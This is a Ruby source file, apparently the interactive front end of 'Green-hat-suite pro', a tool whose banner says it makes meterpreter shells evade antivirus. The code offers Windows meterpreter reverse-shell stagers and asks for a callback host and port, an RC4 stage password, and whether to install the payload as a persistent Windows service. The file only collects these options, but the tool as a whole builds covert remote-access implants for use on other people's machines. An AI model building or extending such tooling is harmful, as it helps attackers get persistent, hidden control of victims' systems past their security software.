#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.3.3

$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'output'
require 'utils'


module Starter
PAYLOAD_ALL_ARRAY = ['windows/meterpreter/reverse_http',
                    'windows/meterpreter/reverse_https',
                    'windows/meterpreter/reverse_tcp',
                    'windows/meterpreter/reverse_tcp_dns',
                    'windows/meterpreter/reverse_tcp_rc4',
                    'windows/meterpreter/reverse_tcp_rc4_dns',
                    'windows/meterpreter/reverse_winhttp',
                    'windows/meterpreter/reverse_winhttps',
                    'custom_payload']

class Console
    def initialize()
        @options = {}
        @options[:payload] = ""
        @options[:host] = ""
        @options[:port] = ""
        @options[:other] = ""

    end

    def start
        

        puts %q{
            
  ____                       _           _                     
 / ___|_ __ ___  ___ _ __   | |__   __ _| |_   _ __  _ __ ___  
| |  _| '__/ _ \/ _ \ '_ \  | '_ \ / _` | __| | '_ \| '__/ _ \ 
| |_| | | |  __/  __/ | | | | | | | (_| | |_  | |_) | | | (_) |
 \____|_|  \___|\___|_| |_| |_| |_|\__,_|\__| | .__/|_|  \___/ 
                                              |_|              

}
        
        puts "Updated:18-01-15"
        puts "Green-hat-suite pro is a tool to make meterpreter/shell evade antivirus."
        puts "Put this green hat on others head."
        puts green("************************************************************************")
        puts green("[*] ")+"windows/meterpreter/reverse_http\t\t\tWindows Reverse HTTP Stager (wininet)"
        puts green("[*] ")+"windows/meterpreter/reverse_https\t\t\tWindows Reverse HTTPS Stager (wininet)"
        puts green("[*] ")+"windows/meterpreter/reverse_tcp   \t\t\tReverse TCP Stager"
        puts green("[*] ")+"windows/meterpreter/reverse_tcp_dns\t\t\tReverse TCP Stager (DNS)"
        puts green("[*] ")+"windows/meterpreter/reverse_tcp_rc4\t\t\tReverse TCP Stager (RC4 Stage Encryption, Metasm)"
        puts green("[*] ")+"windows/meterpreter/reverse_tcp_rc4_dns\t\tReverse TCP Stager (RC4 Stage Encryption DNS, Metasm)"
        puts green("[*] ")+"windows/meterpreter/reverse_winhttp\t\t\tWindows Reverse HTTP Stager (winhttp)"
        puts green("[*] ")+"windows/meterpreter/reverse_winhttps\t\tWindows Reverse HTTPS Stager (winhttp)"
        puts green("[*] ")+"custom_payload\t\t\t\t\tLoad custom raw payload with file."
        puts green("************************************************************************")



        while true
            output_choose "Choose " + red("payload") + ":"
            @options[:payload] = gets.chomp

            if Starter::PAYLOAD_ALL_ARRAY.include? @options[:payload]
                break
            else
                output_warning "Illegal payload,retype it please"
            end

        end

        if @options[:payload] == 'custom_payload'
            while true
                output_choose "Set file to load payload:"
                @options[:file] = gets.chomp
                return @options unless @options[:file].eql?""
            end
        end

        while true
            output_choose "Set reverse " + red("Host") + "(Ip or DNS):" 

            @options[:host] = gets.chomp

            if  (@options[:host] =~ /^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$/) or \
                #(@options[:payload].include?('dns') && @options[:host] =~ /^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$/)
                (@options[:host] =~ /^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$/)
                                    
                break
            else
                output_warning "Illegal format,retype it please" 
            end
        end

        while true
            output_choose "Set reverse "+ red("Port") + " (default:5555):"
            @options[:port] = gets.chomp 
            @options[:port] = '5555' if @options[:port].eql?""

            if  (1..65535).include? @options[:port].to_i
                break
            else
                output_warning "Illegal format,retype it please" 
            end
        end

        if @options[:payload].include?('rc4')

            output_choose "Set RC4 password: (default:greenhat)"
            inputstring = gets.chomp
            @options[:other] = " rc4password="+inputstring
            @options[:other] = ' rc4password=greenhat ' if inputstring.eql?""

        end

        output_choose "Would you like it to be a service?(y/N)"
        @options[:service] = gets.chomp.downcase.eql?('y') 
        if @options[:service]
            output_choose "Set the service name: (default:Meterpreter)"
            @options[:service_name] = gets.chomp
            @options[:service_name] = 'Meterpreter' if @options[:service_name].eql?""

            output_choose "Set the service display name: (default:Meterpreter Service)"
            @options[:display_name] = gets.chomp
            @options[:display_name] = 'Meterpreter Service' if @options[:display_name].eql?""

            output_choose "Set the service retry wait time: (default:5000, millisecond)"
            @options[:sleep_time] = gets.chomp
            @options[:sleep_time] = 5000 if @options[:sleep_time].eql?""
        end
        
        output_choose "Set other option if you have (default:none):"
        @options[:other] += gets.chomp 



        # debug
        #puts @options
        @options
    end




end
end
